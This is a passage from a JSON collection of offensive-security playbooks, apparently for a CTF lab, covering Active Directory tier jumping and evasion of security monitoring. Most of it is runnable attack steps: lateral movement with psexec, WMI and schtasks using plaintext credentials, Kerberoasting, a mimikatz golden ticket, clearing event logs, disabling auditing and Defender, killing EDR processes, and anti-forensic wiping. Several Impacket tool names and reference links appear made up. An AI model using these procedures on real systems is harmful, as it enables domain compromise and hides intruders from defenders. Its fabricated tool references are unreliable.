        "acl",
        "privilege-escalation",
        "bloodhound",
        "active-directory"
      ],
      "related_tools": [
        "aircrack-ng",
        "windows-exploit-suggester",
        "bloodhound-python",
        "comparison_directory_fuzzers",
        "linux-exploit-suggester"
      ]
    },
    {
      "id": "administrative-tier-model-evasion",
      "title": "Administrative tier model evasion and tier jumping",
      "content": "OBJECTIVE: Understand and bypass Microsoft's Administrative Tier Model to escalate privileges between Tier 0 (Domain Controllers), Tier 1 (servers), and Tier 2 (workstations) by exploiting misconfigurations and trust relationships.\n\nACADEMIC BACKGROUND:\nMicrosoft's Administrative Tier Model separates administrative privileges into tiers to prevent credential theft. Tier 0 contains most critical assets (DCs, ADFS, Azure AD Connect). Tier jumping attacks exploit trust relationships and misconfigurations. Understanding tier separation is crucial for advanced Windows persistence and lateral movement.\n\nSTEP-BY-STEP PROCESS:\n\n1. Understanding Administrative Tiers:\n```bash\n# Microsoft Administrative Tier Model:\n# Tier 0: Most critical - Domain Controllers, ADFS, Azure AD Connect, PKI\n# Tier 1: Important servers - SQL, Exchange, file servers\n# Tier 2: Workstations and user endpoints\n\n# Key principle: Tier N+1 admins cannot log into Tier N systems\n# Tier 0 admins only log into Tier 0 systems\n# Prevents credential theft from lower-trust systems\n\n# Common misconfigurations:\n# - Tier 0 admins logging into Tier 1/2 systems\n# - Shared admin accounts across tiers\n# - Weak tier separation enforcement\n```\n\n2. Identifying Tier Structure:\n```bash\n# Enumerate tier structure from compromised host:\n# Check OU structure for tier separation\nGet-ADOrganizationalUnit -Filter * | Where-Object {$_.Name -like \"*Tier*\"}\n\n# Identify Tier 0 assets:\n# Domain Controllers\nGet-ADDomainController -Filter *\n\n# Azure AD Connect servers\nGet-ADComputer -Filter {Name -like \"*AAD*\" -or Name -like \"*Sync*\"}\n\n# ADFS servers\nGet-ADComputer -Filter {ServicePrincipalName -like \"*adfs*\"}\n\n# PKI/CA servers\nGet-ADComputer -Filter {ServicePrincipalName -like \"*CA*\" -or ServicePrincipalName -like \"*PKI*\"}\n```\n\n3. Exploiting Tier Separation Misconfigurations:\n```bash\n# Check for tier jumping opportunities:\n# Look for admin accounts with access across tiers\n\n# Enumerate admin group memberships:\nGet-ADGroupMember -Identity \"Domain Admins\" -Recursive\nGet-ADGroupMember -Identity \"Enterprise Admins\" -Recursive\n\n# Check for shared admin accounts:\n# Accounts that are members of multiple tier groups\n\n# Identify weak tier enforcement:\n# Check GPO settings for logon restrictions\nGet-GPO -All | Where-Object {$_.DisplayName -like \"*Tier*\" -or $_.DisplayName -like \"*Admin*\"}\n```\n\n4. Tier 0 to Tier 1 Escalation:\n```bash\n# From Tier 0 compromise (Domain Admin):\n# Target Tier 1 servers (SQL, Exchange, etc.)\n\n# Use Domain Admin for lateral movement:\n# PSEXEC to Tier 1 servers\npsexec.py ctf.local/adm_backup:BackupAdmin2024!@192.168.100.30 cmd.exe\n\n# WMI execution:\nwmic /user:adm_backup /password:BackupAdmin2024! /node:192.168.100.30 \"process call create 'cmd.exe /c net user tier1admin Pass123! /add'\"\n\n# Scheduled task creation:\nschtasks /create /s srv01.ctf.local /u adm_backup /p BackupAdmin2024! /tn \"Maintenance\" /tr \"cmd.exe\" /sc once /st 00:00\n```\n\n5. Tier 1 to Tier 0 Escalation:\n```bash\n# From Tier 1 compromise:\n# Target Tier 0 systems (DCs)\n\n# Exploit service accounts:\n# If Tier 1 service has Domain Admin rights\n# Extract service account credentials\n\n# Use Kerberoasting on Tier 1 services:\npython3 GetUserSPNs.py ctf.local/jsmith:Welcome2024! -request\n\n# Crack service tickets:\nhashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt\n\n# Use cracked credentials for Tier 0 access\n```\n\n6. Tier 2 to Tier 1/0 Escalation:\n```bash\n# From Tier 2 workstation:\n# Most challenging - need to find escalation path\n\n# Check local admin rights:\nnet localgroup administrators\n\n# Look for privileged service accounts:\n# Check for cached credentials\ncmdkey /list\n\n# Exploit software vulnerabilities:\n# Vulnerable applications on workstation\n# Use for privilege escalation to local admin\n\n# Use local admin for lateral movement:\n# PSEXEC to other systems\npsexec.py \"WORKSTATION/ctf.local\" -hashes :localadminhash @192.168.100.30 cmd.exe\n```\n\n7. Bypassing Tier Restrictions:\n```bash\n# Exploit GPO misconfigurations:\n# Check for weak logon restrictions\nGet-GPResultantSetOfPolicy -Computer workstation.ctf.local -User jsmith\n\n# Modify GPOs if permissions allow:\n# Remove logon restrictions for admin accounts\n\n# Use constrained delegation:\n# If admin accounts have delegation rights\n# Create delegation attack path\n\n# Exploit trust relationships:\n# Cross-forest or external trusts\n# Use for tier jumping\n```\n\n8. Maintaining Access Across Tiers:\n```bash\n# Create backdoors in multiple tiers:\n# Domain Admin persistence (Tier 0)\n# Local admin persistence (Tier 1/2)\n\n# Use service accounts for persistence:\n# Create rogue service accounts with cross-tier access\n\n# Implement golden ticket persistence:\n# Create golden tickets for cross-tier access\nmimikatz.exe kerberos::golden /user:fakeadmin /domain:ctf.local /sid:S-1-5-21-... /krbtgt:krbtgt_hash /ptt\n```\n\n9. Detecting Tier Model Violations:\n```bash\n# Monitor for tier jumping:\n# Check event logs for admin logins to wrong tiers\n# Event ID 4624: Successful logon\n# Filter by logon type and workstation\n\n# Audit admin group membership changes:\n# Event ID 4728: Member added to group\n# Monitor Domain Admins group changes\n\n# Check for GPO modifications:\n# Monitor GPO changes that affect tier restrictions\n```\n\n10. Tier Model Evasion Automation:\n```bash\n# Create tier enumeration script:\ncat > ~/ctf/windows/tools/tier_enum.sh << 'EOF'\n#!/bin/bash\nDOMAIN=$1\nUSER=$2\nPASS=$3\nDC=$4\n\n# Enumerate tier structure\necho \"[*] Enumerating tier OUs...\"\npython3 GetADOrganizationalUnit.py \"$DOMAIN/$USER:$PASS\" -dc-ip \"$DC\"\n\n# Find admin accounts\necho \"[*] Finding admin accounts...\"\npython3 GetADGroup.py \"$DOMAIN/$USER:$PASS\" -dc-ip \"$DC\" -all\n\n# Check for tier violations\necho \"[*] Checking for tier separation issues...\"\n# Look for admin accounts with cross-tier access\n\n# Enumerate Tier 0 assets\necho \"[*] Identifying Tier 0 assets...\"\npython3 GetADDomainController.py \"$DOMAIN/$USER:$PASS\" -dc-ip \"$DC\"\n\nEOF\nchmod +x ~/ctf/windows/tools/tier_enum.sh\n\n# Run: ./tier_enum.sh ctf.local jsmith Welcome2024! 192.168.100.10\n```\n\nWHAT TO LOOK FOR:\n- **Tier Separation Violations**: Admins logging into wrong tier systems\n- **Shared Admin Accounts**: Accounts with access across multiple tiers\n- **Weak GPO Enforcement**: Missing or weak logon restrictions\n- **Service Account Abuse**: Tier 1 services with Domain Admin rights\n- **Delegation Misconfigurations**: Allowing cross-tier delegation\n- **Trust Exploitation**: Using trusts for tier jumping\n- **Inheritance Issues**: Child objects inheriting dangerous permissions\n- **Protected Objects**: AdminSDHolder protects privileged accounts\n\nSECURITY IMPLICATIONS:\n- **Complete Domain Compromise**: Tier 0 breach affects entire environment\n- **Lateral Movement**: Cross-tier access enables network-wide compromise\n- **Credential Theft**: Tier violations expose high-privilege credentials\n- **Compliance Violations**: Tier model bypass violates security frameworks\n- **Incident Response Challenges**: Tier jumping complicates containment\n\nCOMMON PITFALLS:\n- **Tier Identification**: Misidentifying asset tiers\n- **GPO Complexity**: Multiple GPOs affecting same systems\n- **Delegation Conflicts**: Existing delegation blocking new attacks\n- **Audit Gaps**: Missing logging for tier violations\n- **Time-Based Access**: Temporary admin access not properly managed\n- **Cloud Integration**: Azure AD Connect tier considerations\n\nTOOLS REFERENCE:\n- **GetADOrganizationalUnit.py**: Impacket (OU enumeration)\n- **GetADGroup.py**: Impacket (Group enumeration)\n- **GetADDomainController.py**: Impacket (DC enumeration)\n- **psexec.py**: Impacket (Remote execution)\n- **schtasks**: Windows built-in (Task scheduling)\n\nFURTHER READING:\n- Microsoft Tier Model: https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material\n- Tier Model Implementation: https://adsecurity.org/?p=1785\n- Privileged Access Management: https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/privileged-access-management\n- Red Forest Architecture: https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#red-forest",
      "tags": [
        "windows",
        "tier-model",
        "privilege-escalation",
        "lateral-movement",
        "administrative-model"
      ],
      "related_tools": [
        "windows-exploit-suggester",
        "unix-privesc-check",
        "playbook_multi_stage_credential_harvesting",
        "linux-exploit-suggester",
        "playbook_persistence_mechanism_installation"
      ]
    },
    {
      "id": "security-monitoring-evasion",
      "title": "Security monitoring evasion and log manipulation",
      "content": "OBJECTIVE: Evade detection by security monitoring systems, SIEM solutions, and Windows event logging while maintaining persistent access and performing malicious activities.\n\nACADEMIC BACKGROUND:\nWindows security monitoring includes event logs, audit policies, and SIEM integration. Attackers must evade detection from Event IDs 4624/4625 (logons), 4728/4729 (group changes), and 4769 (Kerberos). Understanding Windows logging architecture is crucial for stealthy operations.\n\nSTEP-BY-STEP PROCESS:\n\n1. Understanding Windows Event Logging:\n```bash\n# Key event logs for monitoring:\n# Security: Authentication, privilege use, policy changes\n# System: System events, service failures\n# Application: Application-specific events\n# Directory Service: AD-specific events\n# DNS Server: DNS events\n\n# Critical Event IDs to evade:\n# 4624: Successful account logon\n# 4625: Failed account logon\n# 4728: User added to privileged group\n# 4769: Kerberos service ticket requested\n# 4771: Kerberos pre-auth failed\n# 1102: Audit log cleared\n```\n\n2. Enumerating Current Monitoring:\n```bash\n# Check audit policies:\n# From Windows host\nauditpol /get /category:*\n\n# Check for SIEM agents:\nGet-Process | Where-Object {$_.Name -like \"*splunk*\" -or $_.Name -like \"*syslog*\"}\n\n# Check Windows Defender ATP:\nGet-MpComputerStatus\n\n# Enumerate logging configuration:\nGet-WinEvent -ListLog *\n```\n\n3. Log Manipulation Techniques:\n```bash\n# Clear security logs (requires admin):\n# Use wevtutil\nwevtutil cl Security\nwevtutil cl System\nwevtutil cl Application\n\n# Clear specific events:\n# Use PowerShell\nClear-EventLog -LogName Security\n\n# Disable logging temporarily:\n# Modify audit policies\nauditpol /set /category:\"Logon/Logoff\" /success:disable\n\n# Delete specific events (advanced):\n# Requires system-level access\n```\n\n4. Evading Authentication Monitoring:\n```bash\n# Use legitimate accounts to avoid suspicion:\n# Instead of creating new accounts, use existing privileged accounts\n\n# Time attacks during business hours:\n# Schedule malicious activities during normal work times\n\n# Use VPN or proxy for external access:\n# Route traffic through legitimate channels\n\n# Spoof source IPs:\n# Use compromised legitimate systems as jump hosts\n```\n\n5. Bypassing SIEM Detection:\n```bash\n# Use low-and-slow techniques:\n# Spread activities over time to avoid thresholds\n\n# Use encrypted communications:\n# Encrypt C2 traffic to avoid signature detection\n\n# Mimic legitimate traffic:\n# Use common ports and protocols (443, 80)\n\n# Fragment attacks:\n# Break malicious activities into small, undetectable pieces\n```\n\n6. Evading Endpoint Detection:\n```bash\n# Disable Windows Defender:\nSet-MpPreference -DisableRealtimeMonitoring $true\n\n# Kill EDR processes:\nStop-Process -Name \"MsMpEng\" -Force\n\n# Use fileless techniques:\n# Execute code in memory without touching disk\n\n# Obfuscate payloads:\n# Use packers and obfuscators to hide malware\n```\n\n7. Creating False Positives:\n```bash\n# Generate noise to hide real attacks:\n# Create benign events that trigger alerts\n\n# Use legitimate tools for malicious purposes:\n# Use PowerShell, WMIC, etc. for attacks\n\n# Time attacks around maintenance windows:\n# Schedule during known maintenance periods\n```\n\n8. Anti-Forensic Techniques:\n```bash\n# Timestomp files:\n# Modify file timestamps to blend with legitimate files\n\n# Overwrite free space:\n# Use cipher.exe to overwrite deleted data\ncipher /w:C:\\\n\n# Clear command history:\n# Clear PowerShell and CMD history\nClear-History\n\n# Remove artifacts:\n# Delete temporary files, logs, and tools\n```\n\n9. Monitoring Evasion Automation:\n```bash\n# Create evasion script:\ncat > ~/ctf/windows/tools/evade_monitoring.sh << 'EOF'\n#!/bin/bash\nTARGET=$1\n\n# Check for monitoring agents\necho \"[*] Checking for security monitoring...\"\ncrackmapexec smb \"$TARGET\" -u administrator -p 'password' -M lsassy\n\n# Enumerate logging configuration\necho \"[*] Enumerating logging setup...\"\ncrackmapexec smb \"$TARGET\" -u administrator -p 'password' -X 'auditpol /get /category:*'\n\n# Check for SIEM forwarding\necho \"[*] Checking for log forwarding...\"\ncrackmapexec smb \"$TARGET\" -u administrator -p 'password' -X 'wevtutil gl'\n\nEOF\nchmod +x ~/ctf/windows/tools/evade_monitoring.sh\n```\n\n10. Maintaining Low Profile:\n```bash\n# Use living-off-the-land techniques:\n# Use built-in Windows tools for attacks\n\n# Avoid high-privilege actions:\n# Use minimum required permissions\n\n# Clean up after operations:\n# Remove tools, clear logs, delete artifacts\n\n# Monitor for detection:\n# Watch for security alerts and respond quickly\n```\n\nWHAT TO LOOK FOR:\n- **SIEM Agents**: Splunk, ELK, or custom monitoring agents\n- **EDR Solutions**: Windows Defender ATP, CrowdStrike, etc.\n- **Log Forwarding**: Event log shipping to central systems\n- **Audit Policies**: Enabled security auditing\n- **Network Monitoring**: IDS/IPS systems\n- **Endpoint Protection**: Antivirus and EDR processes\n\nSECURITY IMPLICATIONS:\n- **Undetected Persistence**: Evasion enables long-term access\n- **Data Exfiltration**: Hidden data theft operations\n- **Lateral Movement**: Stealthy network traversal\n- **Ransomware Deployment**: Hidden encryption activities\n- **Intellectual Property Theft**: Covert data exfiltration\n\nCOMMON PITFALLS:\n- **Incomplete Cleanup**: Leaving artifacts behind\n- **Audit Policy Changes**: Modifying auditing triggers alerts\n- **Process Injection**: Memory-based techniques leave traces\n- **Network Signatures**: Unusual traffic patterns detected\n- **Time-Based Detection**: Attacks outside normal hours\n- **Volume Thresholds**: Too many events trigger alerts\n\nTOOLS REFERENCE:\n- **wevtutil**: Windows built-in (Event log management)\n- **auditpol**: Windows built-in (Audit policy management)\n- **Clear-EventLog**: PowerShell (Log clearing)\n- **cipher**: Windows built-in (Data wiping)\n- **crackmapexec**: https://github.com/Porchetta-Industries/CrackMapExec (Monitoring enumeration)\n\nFURTHER READING:\n- Windows Event Logs: https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing-overview\n- SIEM Evasion: https://www.sans.org/cyber-security-skills-roadmap/siem-evasion/\n- Anti-Forensics: https://www.sans.org/cyber-security-skills-roadmap/anti-forensics/\n- Living Off The Land: https://lolbas-project.github.io/\n- MITRE ATT&CK Defense Evasion: https://attack.mitre.org/tactics/TA0005/",
      "tags": [
        "windows",
        "evasion",
        "monitoring",
        "logs",
        "anti-forensics"
      ],
      "related_tools": [
        "windows-exploit-suggester",
        "workflow_evasion_obfuscation",
        "edr-opsec-checklist",
        "dns-tunneling",
        "comparison_directory_fuzzers"
      ]
    }
  ]
}